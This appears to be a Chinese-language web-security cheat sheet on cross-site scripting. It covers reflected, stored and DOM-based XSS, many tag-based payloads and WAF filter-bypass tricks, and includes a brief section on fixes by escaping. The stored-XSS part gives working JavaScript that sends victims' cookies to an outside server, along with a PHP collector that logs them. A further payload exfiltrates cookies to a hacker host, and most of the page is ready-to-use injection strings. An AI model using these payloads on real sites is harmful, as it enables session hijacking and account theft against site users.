<h1 id="反射性"><a href="#反射性" class="headerlink" title="反射性"></a>反射性</h1><p><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%8F%8D%E5%B0%84XSS.md" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%8F%8D%E5%B0%84XSS.md</a></p>
<h1 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h1><p>可以看此文章：<br><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%AD%98%E5%82%A8XSS.md" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%AD%98%E5%82%A8XSS.md</a>   </p>
<h2 id="XSS-盲打后台"><a href="#XSS-盲打后台" class="headerlink" title="XSS 盲打后台"></a>XSS 盲打后台</h2><p>js弹cookie代码 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">  (new Image()).src=<span class="string">'http://simba.im/js/xss.php?cookie='</span>+</span><br><span class="line">  escape(</span><br><span class="line">    (<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">        <span class="built_in">return</span> document.cookie</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">''</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)()</span><br><span class="line">    )+<span class="string">'&amp;location='</span>+</span><br><span class="line">  escape(</span><br><span class="line">    (<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">        <span class="built_in">return</span> document.location.href</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">''</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)()</span><br><span class="line">    );</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>服务器接收代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="keyword">if</span>(isset(<span class="variable">$_REQUEST</span>[<span class="string">'cookie'</span>]) &amp;&amp; isset(<span class="variable">$_REQUEST</span>[<span class="string">'location'</span>])) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$cookie</span> = <span class="variable">$_REQUEST</span>[<span class="string">'cookie'</span>];</span><br><span class="line">        <span class="variable">$location</span> = <span class="variable">$_REQUEST</span>[<span class="string">'location'</span>];</span><br><span class="line">        <span class="variable">$stri</span> = <span class="string">"&lt;td&gt;"</span>.date(DATE_ATOM).<span class="string">"&lt;/td&gt;&lt;td&gt;Cookie:"</span>.<span class="variable">$cookie</span>.<span class="string">"&lt;/td&gt;&lt;td&gt;Location:"</span>.<span class="variable">$location</span>.<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">        <span class="variable">$fp</span> = file_put_contents(<span class="string">"xss.txt"</span>, <span class="variable">$stri</span>.<span class="string">"\n"</span>, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fp</span> = file_get_contents(<span class="string">"xss.txt"</span>);</span><br><span class="line">    <span class="variable">$data</span> = (explode(<span class="string">"\n"</span>, <span class="variable">$fp</span>));</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;table bode=\"1\"&gt;"</span>;</span><br><span class="line">    foreach(<span class="variable">$data</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$value</span> == <span class="string">""</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.(<span class="variable">$key</span>).<span class="string">"&lt;/td&gt;"</span>.<span class="variable">$value</span>.<span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;/table&gt;"</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h1><h2 id="在前端实现页面跳转"><a href="#在前端实现页面跳转" class="headerlink" title="在前端实现页面跳转"></a>在前端实现页面跳转</h2><h3 id="使用indexOf判断URL参数是否合法"><a href="#使用indexOf判断URL参数是否合法" class="headerlink" title="使用indexOf判断URL参数是否合法"></a>使用indexOf判断URL参数是否合法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">emptyFn</span></span>()&#123;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">init</span></span>()&#123;</span><br><span class="line">    var jump = getQueryString(<span class="string">'jump'</span>);</span><br><span class="line">    jump = decodeURIComponent(jump);</span><br><span class="line">    <span class="keyword">if</span> (jump &amp;&amp; jump.indexOf(<span class="string">"tmast://"</span>) &gt; -1) &#123;</span><br><span class="line">        jump = jump;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        jump = <span class="string">"tmast://found"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">        window.JSBReady(<span class="keyword">function</span>(readyState) &#123;</span><br><span class="line">            <span class="keyword">if</span> (readyState) &#123;</span><br><span class="line">                jsb(<span class="string">'closeWebView'</span>,0,<span class="string">'emptyFn'</span>,&#123;&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,1000);</span><br><span class="line">    location.href=jump;</span><br><span class="line">&#125;</span><br><span class="line">init();</span><br></pre></td></tr></table></figure>
<p>传入<code>javascript:alert(1);//tmast://</code></p>
<h3 id="正则表达式缺陷"><a href="#正则表达式缺陷" class="headerlink" title="正则表达式缺陷"></a>正则表达式缺陷</h3><p>示例缺陷代码 [1]：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> VaildURL(sUrl)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">return</span> (/(https?:\/\/)?[\w\-.]+\.(qq|paipai|soso|taotao)\.com($|\/|\\)/i).<span class="built_in">test</span>(sUrl)||</span><br><span class="line">           (/^[\w][\w\/\.\-_%]+$/i).<span class="built_in">test</span>(sUrl)||(/^[\/\\][^\/\\]/i).<span class="built_in">test</span>(sUrl) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示例缺陷代码 [2]：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(typeof(pgvMain) == <span class="string">'function'</span>) &#123;</span><br><span class="line">           pgvMain();</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       var durl = window.location.search.substr(6);</span><br><span class="line"></span><br><span class="line">       var refer = document.referrer;</span><br><span class="line">       <span class="keyword">if</span>(/house.qq.com/.<span class="built_in">test</span>(refer) || refer == <span class="string">''</span>)&#123;</span><br><span class="line">           setTimeout(<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">               window.location.replace(durl);</span><br><span class="line">           &#125;, 2000);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>神奇的符号 ^，加上和不加上，过滤的效果具有天壤之别。攻击者仍然可以构造 <code>javascript:alert(1);//http://www.qq.com</code>来绕过看似严格的过滤</p>
<h2 id="取值写入页面或动态执行"><a href="#取值写入页面或动态执行" class="headerlink" title="取值写入页面或动态执行"></a>取值写入页面或动态执行</h2><h3 id="URL中的取参数值写入页面或动态执行"><a href="#URL中的取参数值写入页面或动态执行" class="headerlink" title="URL中的取参数值写入页面或动态执行"></a>URL中的取参数值写入页面或动态执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> getParameter(name)&#123;</span><br><span class="line">            var r = new RegExp(<span class="string">"(\\?|#|&amp;)"</span> + name + <span class="string">"=([^&amp;#]*)(&amp;|#|$)"</span>), </span><br><span class="line">m = location.href.match(r);</span><br><span class="line">            <span class="built_in">return</span> (!m ? <span class="string">""</span> : m[2]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addEvent(window, <span class="string">"load"</span>, init);</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">init</span></span>()&#123;</span><br><span class="line">		var msg=getParameter(<span class="string">"msg"</span>);</span><br><span class="line">		<span class="keyword">if</span>(msg==<span class="string">""</span>)msg=<span class="string">"服务器忙，请您稍候再试"</span></span><br><span class="line">		<span class="keyword">else</span> msg=unescape(msg);</span><br><span class="line">		var div=document.getElementById(<span class="string">"info"</span>);</span><br><span class="line">		<span class="keyword">if</span>(div) div.innerHTML=msg;</span><br><span class="line">		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/xxx.htm<span class="comment">#msg=&lt;img/src=x onerror=alert(1)&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Cookie取参数值写入页面或动态执行"><a href="#Cookie取参数值写入页面或动态执行" class="headerlink" title="Cookie取参数值写入页面或动态执行"></a>Cookie取参数值写入页面或动态执行</h3><p>示例缺陷代码[1]：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> goto_adtag_url(url, <span class="built_in">type</span>) &#123;</span><br><span class="line">    var userInfo = getCookie(COOKIE_USERINFO);</span><br><span class="line">    userInfo = decodeURIComponent(userInfo);</span><br><span class="line">    <span class="keyword">if</span> (userInfo != <span class="string">''</span>) &#123;</span><br><span class="line">        userInfo = userInfo.replace(/&lt;/g, <span class="string">'\\&lt;'</span>);</span><br><span class="line">        userInfo = userInfo.replace(/&gt;/g, <span class="string">'\\&gt;'</span>);</span><br><span class="line">        userInfo = <span class="built_in">eval</span>(<span class="string">'('</span> + userInfo + <span class="string">')'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>示例缺陷代码[2]：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getISP</span></span>()&#123;var _ptisp = getCookie(<span class="string">"ptisp"</span>);</span><br><span class="line">				var isp = _ptisp ? (_ptisp + <span class="string">"."</span>) : <span class="string">""</span>;</span><br><span class="line">				<span class="built_in">return</span> isp;</span><br><span class="line">			&#125;</span><br><span class="line">window.isp = getISP();</span><br><span class="line">window.mainPath = <span class="string">"http://"</span> + window.isp + <span class="string">"qzs.qq.com"</span>;</span><br><span class="line">window.filePath = <span class="string">"http://"</span> + window.isp + <span class="string">"i.gtimg.cn"</span>;</span><br></pre></td></tr></table></figure>
<h3 id="localStorage、Referer、Window-name、SessionStorage"><a href="#localStorage、Referer、Window-name、SessionStorage" class="headerlink" title="localStorage、Referer、Window name、SessionStorage"></a>localStorage、Referer、Window name、SessionStorage</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var payload = window.name;</span><br><span class="line"></span><br><span class="line">     setTimeout(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">           trigger(window.name);</span><br><span class="line">     &#125;, 1);</span><br><span class="line">     var div = document.createElement(<span class="string">'div'</span>);</span><br><span class="line">     document.documentElement.appendChild(div);</span><br><span class="line"></span><br><span class="line">     div.innerHTML = payload;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">function</span> trigger(payload) &#123;</span><br><span class="line">           div.innerHTML = payload;</span><br><span class="line">     &#125;;</span><br></pre></td></tr></table></figure>
<p>构造</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">'http://localhost/domxss_47/index.php'</span> name=<span class="string">'&lt;svg/onload=alert(1)&gt;'</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>写入页面前先转义。在取值写入页面或动态执行的业务场景下，在将各种来源获取到的参数值传入JavaScript“三姐妹”函数（innerHTML、document.write、eval）处理前，对传入数据中的HTML特殊字符进行转义处理能防止大部分DOM-XSS的产生。此外，根据不同业务的真实情况，还应使用正则表达式，针对传入的数据做更严格的过滤限制，才能保证万无一失</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> htmlEscape(str) &#123;</span><br><span class="line">    <span class="built_in">return</span> str</span><br><span class="line">        .replace(/&amp;/g, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">        .replace(/<span class="string">"/g, '&amp;quot;')</span></span><br><span class="line"><span class="string">        .replace(/'/g, '&amp;#39;')</span></span><br><span class="line"><span class="string">        .replace(/&lt;/g, '&amp;lt;')</span></span><br><span class="line"><span class="string">        .replace(/&gt;/g, '&amp;gt;');</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Value = htmlEscape(value);</span></span><br><span class="line"><span class="string">  div.innerHTML = value;</span></span><br></pre></td></tr></table></figure>
<p>慎用危险的“eval”。需要强调的是，由于JavaScript中的eval函数十分灵活，能够支持执行的字符串编码纷繁复杂。强烈建议，不到万不得已，不要使用eval函数处理不可控的外部数据<br>看下边的示例:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">eval</span>(unescape(<span class="string">"%64%6f...."</span>));&lt;/script&gt;</span><br><span class="line">在JavaScript 中可以直接通过<span class="built_in">eval</span> 执行的字符串有八进制和十六进制 两种编码方式</span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(<span class="string">"\141\154\145\162\164\50\47\u4f60\u597d\47\51"</span>);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(<span class="string">"\x61\x6c\x65\x72\x74\x28\x27\u4f60\u597d\x27\x29"</span>);&lt;/script&gt;</span><br><span class="line">另外，虽然十进制不能直接通过 <span class="built_in">eval</span> 来执行，但可以用 String.fromCharCode 函数先对数值进行解码，然后传递给 <span class="built_in">eval</span> 执行</span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(String.fromCharCode(97, 108, 101, ...));&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h1 id="标签利用"><a href="#标签利用" class="headerlink" title="标签利用"></a>标签利用</h1><h2 id="img"><a href="#img" class="headerlink" title="img"></a>img</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xss利用方式1(推荐)</span><br><span class="line">&lt;script&gt;document.body.appendChild(document.createElement(<span class="string">'img'</span>)).setAttribute(<span class="string">'src'</span>,<span class="string">'http://www.hack.com/cookie.php?cookie='</span>+document.cookie); &lt;/script&gt;   </span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;img src=<span class="string">"x"</span> onerror=alert(1)&gt;</span><br><span class="line">&lt;img src=<span class="string">"1"</span> onerror=<span class="built_in">eval</span>(<span class="string">"alert('xss')"</span>)&gt;</span><br><span class="line"></span><br><span class="line">XSS利用方式3</span><br><span class="line">&lt;img src=1onmouseover=alert(<span class="string">'xss'</span>)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="a"><a href="#a" class="headerlink" title="a"></a>a</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript:alert('xss')"</span>&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:<span class="built_in">eval</span>(alert(<span class="string">'xss'</span>))&gt;aa&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">"javascript:aaa"</span>onmouseover=<span class="string">"alert(/xss/)"</span>&gt;aa&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">XSS利用方式2</span><br><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;</span><br><span class="line">&lt;a href=<span class="string">""</span>onclick=alert(<span class="string">'xss'</span>)&gt;aa&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">利用方式3</span><br><span class="line">&lt;a href=<span class="string">""</span>onclick=<span class="built_in">eval</span>(alert(<span class="string">'xss'</span>))&gt;aa&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">利用方式4</span><br><span class="line">&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(<span class="string">'xss'</span>) y=2016&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<h2 id="input"><a href="#input" class="headerlink" title="input"></a>input</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">标准格式</span><br><span class="line">&lt;input name=<span class="string">"name"</span> value=<span class="string">""</span>&gt;</span><br><span class="line"></span><br><span class="line">利用方式1</span><br><span class="line">&lt;input value=<span class="string">""</span> onclick=alert(<span class="string">'xss'</span>) <span class="built_in">type</span>=<span class="string">"text"</span>&gt;</span><br><span class="line"></span><br><span class="line">利用方式2</span><br><span class="line">&lt;input name=<span class="string">"name"</span> value=<span class="string">""</span> onmouseover=prompt(<span class="string">'xss'</span>) bad=<span class="string">""</span>&gt;</span><br><span class="line"></span><br><span class="line">利用方式4</span><br><span class="line">&lt;input name=<span class="string">"name"</span> value=<span class="string">""</span>&gt;&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="form"><a href="#form" class="headerlink" title="form"></a>form</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;button formaction=javascript:alert(21)&gt;M</span><br><span class="line">&lt;form/action=javascript:alert(22)&gt;&lt;input/<span class="built_in">type</span>=submit&gt;</span><br><span class="line">&lt;form onsubmit=alert(23)&gt;&lt;button&gt;M</span><br></pre></td></tr></table></figure>
<h2 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(<span class="string">"xss"</span>);&gt;&lt;/iframe&gt; </span><br><span class="line">&lt;iframe src=javascript:alert(<span class="string">'xss'</span>); height=5 width=10 /&gt;&lt;iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=<span class="string">"javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;"</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<h2 id="svg"><a href="#svg" class="headerlink" title="svg"></a>svg</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="detail"><a href="#detail" class="headerlink" title="detail"></a>detail</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=<span class="string">"alert('xss');"</span>&gt;</span><br></pre></td></tr></table></figure>
<h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
<h2 id="video"><a href="#video" class="headerlink" title="video"></a>video</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt;&lt;<span class="built_in">source</span> onerror=<span class="string">"alert(1)"</span>&gt;</span><br></pre></td></tr></table></figure>
<h2 id="audio"><a href="#audio" class="headerlink" title="audio"></a>audio</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x  onerror=alert(<span class="string">"xss"</span>);&gt;</span><br></pre></td></tr></table></figure>
<h2 id="body"><a href="#body" class="headerlink" title="body"></a>body</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=alert(<span class="string">"xss"</span>);&gt;</span><br></pre></td></tr></table></figure>
<h2 id="textarea"><a href="#textarea" class="headerlink" title="textarea"></a>textarea</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea onfocus=alert(<span class="string">"xss"</span>); autofocus&gt;</span><br></pre></td></tr></table></figure>
<h2 id="keygen"><a href="#keygen" class="headerlink" title="keygen"></a>keygen</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>用/代替空格</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">"x"</span>/<span class="attr">onerror</span>=<span class="string">alert(</span>"<span class="attr">xss</span>");&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(</span>"<span class="attr">xss</span>");&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="双写关键字"><a href="#双写关键字" class="headerlink" title="双写关键字"></a>双写关键字</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>"<span class="attr">xss</span>");&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><p>利用eval</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">"a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用top</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">top[<span class="string">"al"</span>+<span class="string">"ert"</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="其它字符混淆"><a href="#其它字符混淆" class="headerlink" title="其它字符混淆"></a>其它字符混淆</h3><p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可利用注释、标签的优先级等</span><br><span class="line">1.&lt;&lt;script&gt;alert("xss");//&lt;&lt;/script&gt;</span><br><span class="line">2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror="alert(`xss`);"&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line">3.<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="actionscript"><span class="keyword">var</span> a=<span class="string">"\\"</span>;alert(<span class="string">"xss"</span>);<span class="comment">//";</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>Unicode编码绕过</p>
